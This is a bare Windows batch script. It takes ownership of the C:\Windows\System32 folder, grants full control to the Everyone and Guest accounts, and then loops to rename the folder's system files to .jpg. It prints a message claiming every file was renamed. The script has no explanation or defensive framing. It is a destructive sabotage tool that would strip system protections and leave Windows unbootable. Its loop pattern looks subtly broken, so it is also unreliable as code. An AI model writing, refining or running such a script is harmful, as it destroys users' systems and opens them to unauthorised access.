Takeown /f C:\Windows\System32\
icacls "%SystemRoot%\system32" /grant:r "Everyone:(OI)(CI)F" "Guest:(OI)(CI)F"
@echo off
setlocal EnableDelayedExpansion

set "dir=C:\Windows\System32"

for %%f in ("%dir%\.") do (
  set "filename=%%~nf"
  set "extension=%%~xf"
  ren "%%f" "!filename!.jpg"
)

echo All files in %dir% have been renamed to .jpg extension.
pause